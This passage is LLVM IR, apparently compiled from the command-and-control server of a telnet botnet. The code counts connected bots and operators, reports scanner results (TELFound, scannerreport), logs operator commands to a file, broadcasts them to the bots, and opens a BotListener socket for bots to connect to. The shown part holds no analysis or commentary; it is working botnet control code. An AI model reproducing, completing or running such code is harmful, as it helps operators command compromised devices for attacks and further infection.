  %166 = getelementptr inbounds [2048 x i8], [2048 x i8]* %40, i64 0, i64 0
  %167 = getelementptr inbounds [80 x i8], [80 x i8]* %35, i64 0, i64 0
  %168 = getelementptr inbounds [80 x i8], [80 x i8]* %36, i64 0, i64 0
  %169 = getelementptr inbounds [80 x i8], [80 x i8]* %37, i64 0, i64 0
  %170 = getelementptr inbounds [80 x i8], [80 x i8]* %38, i64 0, i64 0
  %171 = getelementptr inbounds [80 x i8], [80 x i8]* %39, i64 0, i64 0
  %172 = getelementptr inbounds [80 x i8], [80 x i8]* %18, i64 0, i64 0
  %173 = getelementptr inbounds [80 x i8], [80 x i8]* %19, i64 0, i64 0
  %174 = getelementptr inbounds [80 x i8], [80 x i8]* %20, i64 0, i64 0
  %175 = getelementptr inbounds [80 x i8], [80 x i8]* %21, i64 0, i64 0
  %176 = getelementptr inbounds [80 x i8], [80 x i8]* %22, i64 0, i64 0
  %177 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i64 0, i64 0
  %178 = getelementptr inbounds [80 x i8], [80 x i8]* %25, i64 0, i64 0
  %179 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i64 0, i64 0
  %180 = getelementptr inbounds [80 x i8], [80 x i8]* %27, i64 0, i64 0
  %181 = getelementptr inbounds [80 x i8], [80 x i8]* %28, i64 0, i64 0
  %182 = getelementptr inbounds [80 x i8], [80 x i8]* %29, i64 0, i64 0
  %183 = getelementptr inbounds [80 x i8], [80 x i8]* %30, i64 0, i64 0
  %184 = getelementptr inbounds [80 x i8], [80 x i8]* %31, i64 0, i64 0
  %185 = getelementptr inbounds [80 x i8], [80 x i8]* %32, i64 0, i64 0
  %186 = getelementptr inbounds [80 x i8], [80 x i8]* %33, i64 0, i64 0
  %187 = getelementptr inbounds [80 x i8], [80 x i8]* %34, i64 0, i64 0
  %188 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i64 0, i64 0
  %189 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %190 = getelementptr inbounds [2048 x i8], [2048 x i8]* %16, i64 0, i64 0
  %191 = getelementptr inbounds [2048 x i8], [2048 x i8]* %41, i64 0, i64 11
  %192 = getelementptr inbounds [2048 x i8], [2048 x i8]* %40, i64 0, i64 19
  br label %193

; <label>:193:                                    ; preds = %.lr.ph, %.backedge
  %194 = call i8* @strstr(i8* nonnull %51, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.38, i64 0, i64 0)) #9
  %195 = icmp eq i8* %194, null
  br i1 %195, label %206, label %196

; <label>:196:                                    ; preds = %193
  call void @llvm.memset.p0i8.i64(i8* nonnull %190, i8 0, i64 2048, i32 16, i1 false)
  %197 = call i32 @BotsConnected()
  %198 = load volatile i32, i32* @OperatorsConnected, align 4
  %199 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %190, i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.39, i64 0, i64 0), i32 %197, i32 %198) #10
  %200 = call i64 @strlen(i8* nonnull %190) #9
  %201 = call i64 @send(i32 %48, i8* nonnull %190, i64 %200, i32 16384) #10
  %202 = icmp eq i64 %201, -1
  br i1 %202, label %.loopexit110.loopexit, label %203

; <label>:203:                                    ; preds = %196
  %204 = call i64 @send(i32 %48, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i64 0, i64 0), i64 12, i32 16384) #10
  %205 = icmp eq i64 %204, -1
  br i1 %205, label %.loopexit.loopexit, label %.backedge

; <label>:206:                                    ; preds = %193
  %207 = call i8* @strstr(i8* nonnull %51, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.40, i64 0, i64 0)) #9
  %208 = icmp eq i8* %207, null
  br i1 %208, label %219, label %209

; <label>:209:                                    ; preds = %206
  call void @llvm.memset.p0i8.i64(i8* nonnull %189, i8 0, i64 2048, i32 16, i1 false)
  %210 = load volatile i32, i32* @TELFound, align 4
  %211 = load volatile i32, i32* @scannerreport, align 4
  %212 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %189, i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.41, i64 0, i64 0), i32 %210, i32 %211) #10
  %213 = call i64 @strlen(i8* nonnull %189) #9
  %214 = call i64 @send(i32 %48, i8* nonnull %189, i64 %213, i32 16384) #10
  %215 = icmp eq i64 %214, -1
  br i1 %215, label %.loopexit110.loopexit, label %216

; <label>:216:                                    ; preds = %209
  %217 = call i64 @send(i32 %48, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i64 0, i64 0), i64 12, i32 16384) #10
  %218 = icmp eq i64 %217, -1
  br i1 %218, label %.loopexit.loopexit, label %.backedge

; <label>:219:                                    ; preds = %206
  %220 = call i8* @strstr(i8* nonnull %51, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.42, i64 0, i64 0)) #9
  %221 = icmp eq i8* %220, null
  br i1 %221, label %296, label %222

; <label>:222:                                    ; preds = %219
  %223 = call i32 @pthread_create(i64* nonnull %2, %union.pthread_attr_t* null, i8* (i8*)* nonnull @TitleWriter, i8* %0) #10
  %224 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %172, i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.43, i64 0, i64 0), i8* %73) #10
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %173, i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.44, i64 0, i64 0), i64 68, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %174, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.45, i64 0, i64 0), i64 72, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %175, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.46, i64 0, i64 0), i64 56, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %176, i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.47, i64 0, i64 0), i64 60, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %177, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.48, i64 0, i64 0), i64 12, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %178, i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.49, i64 0, i64 0), i64 76, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %179, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.48, i64 0, i64 0), i64 12, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %180, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.50, i64 0, i64 0), i64 57, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %181, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.51, i64 0, i64 0), i64 57, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %182, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.52, i64 0, i64 0), i64 57, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %183, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.53, i64 0, i64 0), i64 57, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %184, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.54, i64 0, i64 0), i64 57, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %185, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.55, i64 0, i64 0), i64 57, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %186, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.56, i64 0, i64 0), i64 57, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %187, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.48, i64 0, i64 0), i64 12, i32 1, i1 false)
  %225 = call i64 @strlen(i8* nonnull %172) #9
  %226 = call i64 @send(i32 %48, i8* nonnull %172, i64 %225, i32 16384) #10
  %227 = icmp eq i64 %226, -1
  br i1 %227, label %.loopexit.loopexit, label %228

; <label>:228:                                    ; preds = %222
  %229 = call i64 @strlen(i8* nonnull %173) #9
  %230 = call i64 @send(i32 %48, i8* nonnull %173, i64 %229, i32 16384) #10
  %231 = icmp eq i64 %230, -1
  br i1 %231, label %.loopexit.loopexit, label %232

; <label>:232:                                    ; preds = %228
  %233 = call i64 @strlen(i8* nonnull %174) #9
  %234 = call i64 @send(i32 %48, i8* nonnull %174, i64 %233, i32 16384) #10
  %235 = icmp eq i64 %234, -1
  br i1 %235, label %.loopexit.loopexit, label %236

; <label>:236:                                    ; preds = %232
  %237 = call i64 @strlen(i8* nonnull %175) #9
  %238 = call i64 @send(i32 %48, i8* nonnull %175, i64 %237, i32 16384) #10
  %239 = icmp eq i64 %238, -1
  br i1 %239, label %.loopexit.loopexit, label %240

; <label>:240:                                    ; preds = %236
  %241 = call i64 @strlen(i8* nonnull %176) #9
  %242 = call i64 @send(i32 %48, i8* nonnull %176, i64 %241, i32 16384) #10
  %243 = icmp eq i64 %242, -1
  br i1 %243, label %.loopexit.loopexit, label %244

; <label>:244:                                    ; preds = %240
  %245 = call i64 @strlen(i8* nonnull %188) #9
  %246 = call i64 @send(i32 %48, i8* nonnull %188, i64 %245, i32 16384) #10
  %247 = icmp eq i64 %246, -1
  br i1 %247, label %.loopexit.loopexit, label %248

; <label>:248:                                    ; preds = %244
  %249 = call i64 @strlen(i8* nonnull %177) #9
  %250 = call i64 @send(i32 %48, i8* nonnull %177, i64 %249, i32 16384) #10
  %251 = icmp eq i64 %250, -1
  br i1 %251, label %.loopexit.loopexit, label %252

; <label>:252:                                    ; preds = %248
  %253 = call i64 @strlen(i8* nonnull %178) #9
  %254 = call i64 @send(i32 %48, i8* nonnull %178, i64 %253, i32 16384) #10
  %255 = icmp eq i64 %254, -1
  br i1 %255, label %.loopexit.loopexit, label %256

; <label>:256:                                    ; preds = %252
  %257 = call i64 @strlen(i8* nonnull %179) #9
  %258 = call i64 @send(i32 %48, i8* nonnull %179, i64 %257, i32 16384) #10
  %259 = icmp eq i64 %258, -1
  br i1 %259, label %.loopexit.loopexit, label %260

; <label>:260:                                    ; preds = %256
  %261 = call i64 @strlen(i8* nonnull %180) #9
  %262 = call i64 @send(i32 %48, i8* nonnull %180, i64 %261, i32 16384) #10
  %263 = icmp eq i64 %262, -1
  br i1 %263, label %.loopexit.loopexit, label %264

; <label>:264:                                    ; preds = %260
  %265 = call i64 @strlen(i8* nonnull %181) #9
  %266 = call i64 @send(i32 %48, i8* nonnull %181, i64 %265, i32 16384) #10
  %267 = icmp eq i64 %266, -1
  br i1 %267, label %.loopexit.loopexit, label %268

; <label>:268:                                    ; preds = %264
  %269 = call i64 @strlen(i8* nonnull %182) #9
  %270 = call i64 @send(i32 %48, i8* nonnull %182, i64 %269, i32 16384) #10
  %271 = icmp eq i64 %270, -1
  br i1 %271, label %.loopexit.loopexit, label %272

; <label>:272:                                    ; preds = %268
  %273 = call i64 @strlen(i8* nonnull %183) #9
  %274 = call i64 @send(i32 %48, i8* nonnull %183, i64 %273, i32 16384) #10
  %275 = icmp eq i64 %274, -1
  br i1 %275, label %.loopexit.loopexit, label %276

; <label>:276:                                    ; preds = %272
  %277 = call i64 @strlen(i8* nonnull %184) #9
  %278 = call i64 @send(i32 %48, i8* nonnull %184, i64 %277, i32 16384) #10
  %279 = icmp eq i64 %278, -1
  br i1 %279, label %.loopexit.loopexit, label %280

; <label>:280:                                    ; preds = %276
  %281 = call i64 @strlen(i8* nonnull %185) #9
  %282 = call i64 @send(i32 %48, i8* nonnull %185, i64 %281, i32 16384) #10
  %283 = icmp eq i64 %282, -1
  br i1 %283, label %.loopexit.loopexit, label %284

; <label>:284:                                    ; preds = %280
  %285 = call i64 @strlen(i8* nonnull %186) #9
  %286 = call i64 @send(i32 %48, i8* nonnull %186, i64 %285, i32 16384) #10
  %287 = icmp eq i64 %286, -1
  br i1 %287, label %.loopexit.loopexit, label %288

; <label>:288:                                    ; preds = %284
  %289 = call i64 @strlen(i8* nonnull %187) #9
  %290 = call i64 @send(i32 %48, i8* nonnull %187, i64 %289, i32 16384) #10
  %291 = icmp eq i64 %290, -1
  br i1 %291, label %.loopexit.loopexit, label %292

; <label>:292:                                    ; preds = %288
  %293 = call i32 @pthread_create(i64* nonnull %2, %union.pthread_attr_t* null, i8* (i8*)* nonnull @TitleWriter, i8* %0) #10
  %294 = call i64 @send(i32 %48, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i64 0, i64 0), i64 12, i32 16384) #10
  %295 = icmp eq i64 %294, -1
  br i1 %295, label %.loopexit.loopexit, label %.backedge

; <label>:296:                                    ; preds = %219
  %297 = call i8* @strstr(i8* nonnull %51, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.57, i64 0, i64 0)) #9
  %298 = icmp eq i8* %297, null
  br i1 %298, label %324, label %299

; <label>:299:                                    ; preds = %296
  %300 = call i32 @pthread_create(i64* nonnull %2, %union.pthread_attr_t* null, i8* (i8*)* nonnull @TitleWriter, i8* %0) #10
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %167, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.58, i64 0, i64 0), i64 50, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %168, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.59, i64 0, i64 0), i64 56, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %169, i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.60, i64 0, i64 0), i64 60, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %170, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.61, i64 0, i64 0), i64 44, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %171, i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.62, i64 0, i64 0), i64 48, i32 1, i1 false)
  %301 = call i64 @strlen(i8* nonnull %167) #9
  %302 = call i64 @send(i32 %48, i8* nonnull %167, i64 %301, i32 16384) #10
  %303 = icmp eq i64 %302, -1
  br i1 %303, label %.loopexit.loopexit, label %304

; <label>:304:                                    ; preds = %299
  %305 = call i64 @strlen(i8* nonnull %168) #9
  %306 = call i64 @send(i32 %48, i8* nonnull %168, i64 %305, i32 16384) #10
  %307 = icmp eq i64 %306, -1
  br i1 %307, label %.loopexit.loopexit, label %308

; <label>:308:                                    ; preds = %304
  %309 = call i64 @strlen(i8* nonnull %169) #9
  %310 = call i64 @send(i32 %48, i8* nonnull %169, i64 %309, i32 16384) #10
  %311 = icmp eq i64 %310, -1
  br i1 %311, label %.loopexit.loopexit, label %312

; <label>:312:                                    ; preds = %308
  %313 = call i64 @strlen(i8* nonnull %170) #9
  %314 = call i64 @send(i32 %48, i8* nonnull %170, i64 %313, i32 16384) #10
  %315 = icmp eq i64 %314, -1
  br i1 %315, label %.loopexit.loopexit, label %316

; <label>:316:                                    ; preds = %312
  %317 = call i64 @strlen(i8* nonnull %171) #9
  %318 = call i64 @send(i32 %48, i8* nonnull %171, i64 %317, i32 16384) #10
  %319 = icmp eq i64 %318, -1
  br i1 %319, label %.loopexit.loopexit, label %320

; <label>:320:                                    ; preds = %316
  %321 = call i32 @pthread_create(i64* nonnull %2, %union.pthread_attr_t* null, i8* (i8*)* nonnull @TitleWriter, i8* %0) #10
  %322 = call i64 @send(i32 %48, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i64 0, i64 0), i64 12, i32 16384) #10
  %323 = icmp eq i64 %322, -1
  br i1 %323, label %.loopexit.loopexit, label %.backedge

; <label>:324:                                    ; preds = %296
  %325 = call i8* @strstr(i8* nonnull %51, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.63, i64 0, i64 0)) #9
  %326 = icmp eq i8* %325, null
  br i1 %326, label %334, label %327

; <label>:327:                                    ; preds = %324
  call void @llvm.memset.p0i8.i64(i8* %192, i8 0, i64 2029, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %166, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.64, i64 0, i64 0), i64 19, i32 1, i1 false)
  %328 = call i64 @strlen(i8* nonnull %166) #9
  %329 = call i64 @send(i32 %48, i8* nonnull %166, i64 %328, i32 16384) #10
  %330 = icmp eq i64 %329, -1
  br i1 %330, label %.loopexit.loopexit, label %331

; <label>:331:                                    ; preds = %327
  %332 = call i64 @send(i32 %48, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i64 0, i64 0), i64 12, i32 16384) #10
  %333 = icmp eq i64 %332, -1
  br i1 %333, label %.loopexit.loopexit, label %.backedge

; <label>:334:                                    ; preds = %324
  %335 = call i8* @strstr(i8* nonnull %51, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.65, i64 0, i64 0)) #9
  %336 = icmp eq i8* %335, null
  br i1 %336, label %388, label %337

; <label>:337:                                    ; preds = %334
  call void @llvm.memset.p0i8.i64(i8* %191, i8 0, i64 2037, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %165, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.66, i64 0, i64 0), i64 11, i32 1, i1 false)
  %338 = call i64 @strlen(i8* nonnull %165) #9
  %339 = call i64 @send(i32 %48, i8* nonnull %165, i64 %338, i32 16384) #10
  %340 = icmp eq i64 %339, -1
  br i1 %340, label %.loopexit.loopexit, label %341

; <label>:341:                                    ; preds = %337
  %342 = call i64 @strlen(i8* nonnull %89) #9
  %343 = call i64 @send(i32 %48, i8* nonnull %89, i64 %342, i32 16384) #10
  %344 = icmp eq i64 %343, -1
  br i1 %344, label %.loopexit.loopexit, label %345

; <label>:345:                                    ; preds = %341
  %346 = call i64 @strlen(i8* nonnull %90) #9
  %347 = call i64 @send(i32 %48, i8* nonnull %90, i64 %346, i32 16384) #10
  %348 = icmp eq i64 %347, -1
  br i1 %348, label %.loopexit.loopexit, label %349

; <label>:349:                                    ; preds = %345
  %350 = call i64 @strlen(i8* nonnull %91) #9
  %351 = call i64 @send(i32 %48, i8* nonnull %91, i64 %350, i32 16384) #10
  %352 = icmp eq i64 %351, -1
  br i1 %352, label %.loopexit.loopexit, label %353

; <label>:353:                                    ; preds = %349
  %354 = call i64 @strlen(i8* nonnull %92) #9
  %355 = call i64 @send(i32 %48, i8* nonnull %92, i64 %354, i32 16384) #10
  %356 = icmp eq i64 %355, -1
  br i1 %356, label %.loopexit.loopexit, label %357

; <label>:357:                                    ; preds = %353
  %358 = call i64 @strlen(i8* nonnull %93) #9
  %359 = call i64 @send(i32 %48, i8* nonnull %93, i64 %358, i32 16384) #10
  %360 = icmp eq i64 %359, -1
  br i1 %360, label %.loopexit.loopexit, label %361

; <label>:361:                                    ; preds = %357
  %362 = call i64 @strlen(i8* nonnull %94) #9
  %363 = call i64 @send(i32 %48, i8* nonnull %94, i64 %362, i32 16384) #10
  %364 = icmp eq i64 %363, -1
  br i1 %364, label %.loopexit.loopexit, label %365

; <label>:365:                                    ; preds = %361
  %366 = call i64 @strlen(i8* nonnull %95) #9
  %367 = call i64 @send(i32 %48, i8* nonnull %95, i64 %366, i32 16384) #10
  %368 = icmp eq i64 %367, -1
  br i1 %368, label %.loopexit.loopexit, label %369

; <label>:369:                                    ; preds = %365
  %370 = call i64 @strlen(i8* nonnull %96) #9
  %371 = call i64 @send(i32 %48, i8* nonnull %96, i64 %370, i32 16384) #10
  %372 = icmp eq i64 %371, -1
  br i1 %372, label %.loopexit.loopexit, label %373

; <label>:373:                                    ; preds = %369
  %374 = call i64 @strlen(i8* nonnull %97) #9
  %375 = call i64 @send(i32 %48, i8* nonnull %97, i64 %374, i32 16384) #10
  %376 = icmp eq i64 %375, -1
  br i1 %376, label %.loopexit.loopexit, label %377

; <label>:377:                                    ; preds = %373
  %378 = call i64 @strlen(i8* nonnull %98) #9
  %379 = call i64 @send(i32 %48, i8* nonnull %98, i64 %378, i32 16384) #10
  %380 = icmp eq i64 %379, -1
  br i1 %380, label %.loopexit.loopexit, label %381

; <label>:381:                                    ; preds = %377
  %382 = call i64 @strlen(i8* nonnull %88) #9
  %383 = call i64 @send(i32 %48, i8* nonnull %88, i64 %382, i32 16384) #10
  %384 = icmp eq i64 %383, -1
  br i1 %384, label %.loopexit.loopexit, label %385

; <label>:385:                                    ; preds = %381
  %386 = call i64 @send(i32 %48, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i64 0, i64 0), i64 12, i32 16384) #10
  %387 = icmp eq i64 %386, -1
  br i1 %387, label %.loopexit.loopexit, label %.backedge

; <label>:388:                                    ; preds = %334
  %389 = call i8* @strstr(i8* nonnull %51, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i64 0, i64 0)) #9
  %390 = icmp eq i8* %389, null
  br i1 %390, label %400, label %391

; <label>:391:                                    ; preds = %388
  %392 = call i32 @pthread_create(i64* nonnull %2, %union.pthread_attr_t* null, i8* (i8*)* nonnull @TitleWriter, i8* %0) #10
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %164, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.68, i64 0, i64 0), i64 57, i32 1, i1 false)
  %393 = call i64 @strlen(i8* nonnull %164) #9
  %394 = call i64 @send(i32 %48, i8* nonnull %164, i64 %393, i32 16384) #10
  %395 = icmp eq i64 %394, -1
  br i1 %395, label %.loopexit.loopexit, label %396

; <label>:396:                                    ; preds = %391
  %397 = call i32 @pthread_create(i64* nonnull %2, %union.pthread_attr_t* null, i8* (i8*)* nonnull @TitleWriter, i8* %0) #10
  %398 = call i64 @send(i32 %48, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i64 0, i64 0), i64 12, i32 16384) #10
  %399 = icmp eq i64 %398, -1
  br i1 %399, label %.loopexit.loopexit, label %.backedge

; <label>:400:                                    ; preds = %388
  %401 = call i8* @strstr(i8* nonnull %51, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.69, i64 0, i64 0)) #9
  %402 = icmp eq i8* %401, null
  br i1 %402, label %412, label %403

; <label>:403:                                    ; preds = %400
  %404 = call i32 @pthread_create(i64* nonnull %2, %union.pthread_attr_t* null, i8* (i8*)* nonnull @TitleWriter, i8* %0) #10
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %163, i8* getelementptr inbounds ([98 x i8], [98 x i8]* @.str.70, i64 0, i64 0), i64 98, i32 1, i1 false)
  %405 = call i64 @strlen(i8* nonnull %163) #9
  %406 = call i64 @send(i32 %48, i8* nonnull %163, i64 %405, i32 16384) #10
  %407 = icmp eq i64 %406, -1
  br i1 %407, label %.loopexit.loopexit, label %408

; <label>:408:                                    ; preds = %403
  %409 = call i32 @pthread_create(i64* nonnull %2, %union.pthread_attr_t* null, i8* (i8*)* nonnull @TitleWriter, i8* %0) #10
  %410 = call i64 @send(i32 %48, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i64 0, i64 0), i64 12, i32 16384) #10
  %411 = icmp eq i64 %410, -1
  br i1 %411, label %.loopexit.loopexit, label %.backedge

; <label>:412:                                    ; preds = %400
  %413 = call i8* @strstr(i8* nonnull %51, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i64 0, i64 0)) #9
  %414 = icmp eq i8* %413, null
  br i1 %414, label %423, label %415

; <label>:415:                                    ; preds = %412
  %416 = getelementptr inbounds [2048 x i8], [2048 x i8]* %44, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %416, i8 0, i64 2048, i32 16, i1 false)
  %417 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %416, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.72, i64 0, i64 0), i8* %73) #10
  %418 = call i64 @strlen(i8* nonnull %416) #9
  %419 = call i64 @send(i32 %48, i8* nonnull %416, i64 %418, i32 16384) #10
  %420 = icmp eq i64 %419, -1
  br i1 %420, label %.loopexit, label %421

; <label>:421:                                    ; preds = %415
  %422 = call i32 @sleep(i32 5) #10
  br label %.loopexit

; <label>:423:                                    ; preds = %412
  call void @trim(i8* nonnull %51)
  %424 = call i64 @send(i32 %48, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i64 0, i64 0), i64 11, i32 16384) #10
  %425 = icmp eq i64 %424, -1
  br i1 %425, label %.loopexit.loopexit, label %426

; <label>:426:                                    ; preds = %423
  %427 = call i64 @strlen(i8* nonnull %51) #9
  %428 = icmp eq i64 %427, 0
  br i1 %428, label %.backedge, label %429

; <label>:429:                                    ; preds = %426
  %430 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.73, i64 0, i64 0), i8* %73, i8* nonnull %51)
  %431 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.74, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.75, i64 0, i64 0))
  %432 = call i64 @time(i64* null) #10
  store i64 %432, i64* %45, align 8
  %433 = call %struct.tm* @gmtime(i64* nonnull %45) #10
  %434 = call i64 @strftime(i8* nonnull %162, i64 50, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.76, i64 0, i64 0), %struct.tm* %433) #10
  %435 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %431, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.77, i64 0, i64 0), i8* nonnull %162, i8* %73, i8* nonnull %51)
  %436 = call i32 @fclose(%struct._IO_FILE* %431)
  call void @broadcast(i8* nonnull %51, i32 %48, i8* %73)
  call void @llvm.memset.p0i8.i64(i8* nonnull %51, i8 0, i64 2048, i32 16, i1 false)
  br label %.backedge

.backedge:                                        ; preds = %429, %203, %216, %292, %320, %331, %385, %396, %408, %426
  %437 = call i32 @fdgets(i8* nonnull %51, i32 2048, i32 %48)
  %438 = icmp sgt i32 %437, 0
  br i1 %438, label %193, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %.backedge, %423, %408, %403, %396, %391, %385, %381, %377, %373, %369, %365, %361, %357, %353, %349, %345, %341, %337, %331, %327, %320, %316, %312, %308, %304, %299, %292, %288, %284, %280, %276, %272, %268, %264, %260, %256, %252, %248, %244, %240, %236, %232, %228, %222, %216, %203
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %156, %415, %153, %149, %145, %141, %137, %133, %129, %125, %121, %117, %113, %86, %106, %103, %79, %76, %66, %._crit_edge, %421, %111
  %sext = shl i64 %47, 32
  %439 = ashr exact i64 %sext, 32
  %440 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %439, i32 0
  store i32 0, i32* %440, align 4
  %441 = call i32 @close(i32 %48) #10
  %442 = load volatile i32, i32* @OperatorsConnected, align 4
  %443 = add nsw i32 %442, -1
  store volatile i32 %443, i32* @OperatorsConnected, align 4
  br label %.loopexit110

.loopexit110.loopexit:                            ; preds = %196, %209
  br label %.loopexit110

.loopexit110:                                     ; preds = %.loopexit110.loopexit, %.loopexit
  ret i8* null
}

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE* nocapture) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @fgetc(%struct._IO_FILE* nocapture) local_unnamed_addr #3

; Function Attrs: nounwind
declare void @rewind(%struct._IO_FILE* nocapture) local_unnamed_addr #3

declare i32 @__isoc99_fscanf(%struct._IO_FILE*, i8*, ...) local_unnamed_addr #1

; Function Attrs: nounwind
declare i32 @pthread_create(i64*, %union.pthread_attr_t*, i8* (i8*)*, i8*) local_unnamed_addr #3

; Function Attrs: nounwind
declare %struct.tm* @gmtime(i64*) local_unnamed_addr #3

; Function Attrs: nounwind
declare i64 @strftime(i8*, i64, i8*, %struct.tm*) local_unnamed_addr #3

; Function Attrs: noinline noreturn nounwind uwtable
define noalias nonnull i8* @BotListener(i32) #5 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = alloca i64, align 8
  %6 = tail call i32 @socket(i32 2, i32 1, i32 0) #10
  %7 = icmp slt i32 %6, 0
  br i1 %7, label %8, label %9

; <label>:8:                                      ; preds = %1
  tail call void @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.78, i64 0, i64 0)) #12
  br label %9

; <label>:9:                                      ; preds = %8, %1
  %10 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 3, i64 0
  %11 = bitcast i8* %10 to i64*
  store i64 0, i64* %11, align 4
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 0
  store i16 2, i16* %12, align 4
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 2, i32 0
  store i32 0, i32* %13, align 4
  %14 = trunc i32 %0 to i16
  %15 = tail call zeroext i16 @htons(i16 zeroext %14) #11
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 1
  store i16 %15, i16* %16, align 2
  %17 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
